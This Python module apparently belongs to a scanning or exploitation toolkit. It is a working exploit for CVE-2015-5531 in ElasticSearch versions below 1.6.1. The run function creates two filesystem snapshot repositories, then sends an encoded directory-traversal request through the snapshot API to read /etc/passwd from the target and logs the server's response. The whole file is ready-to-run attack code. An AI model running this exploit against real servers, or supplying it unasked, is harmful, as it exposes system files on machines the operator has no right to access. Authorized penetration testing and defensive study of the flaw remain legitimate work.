import json
from typing import Optional

import requests

from lib.log import logger


def run(url: str) -> Optional[str]:
    """Exploit directory traversal vulnerability in ElasticSearch (CVE-2015-5531).
    Version: < 1.6.1."""
    target_url = f"{url}:9200/_snapshot/test"
    try:
        # Step 1: Create backup repository
        data = {
            "type": "fs",
            "settings": {
                "location": "/usr/share/elasticsearch/repo/test"
            }
        }
        logger.info(f"Creating backup repository at {target_url}")
        response = requests.put(target_url, data=json.dumps(data), timeout=5, verify=False)
        if '"accepted": true' in response.text and response.status_code == 200:
            logger.success("[+] Build backup success")

            # Step 2: Create snapshot repository
            data2 = {
                "type": "fs",
                "settings": {
                    "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata"
                }
            }
            logger.info("Creating snapshot repository")
            response2 = requests.put(f"{url}:9200/_snapshot/test2", data=json.dumps(data2), timeout=5, verify=False)
            if '"accepted": true' in response2.text and response2.status_code == 200:
                logger.success("[+] Build snapshot success")

                # Step 3: Attempt directory traversal
                traversal_url = f"{url}:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
                logger.info(f"Attempting traversal at {traversal_url}")
                response3 = requests.get(traversal_url, timeout=5, verify=False)
                if response3.status_code == 400:
                    logger.info(f"Traversal response: {response3.text}")
                    return "reading /etc/passwd"
                logger.warning(f"Traversal failed, status code: {response3.status_code}")
                return None
        logger.warning("Backup or snapshot creation failed")
        return None
    except requests.RequestException as e:
        logger.error(f"Request failed: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None
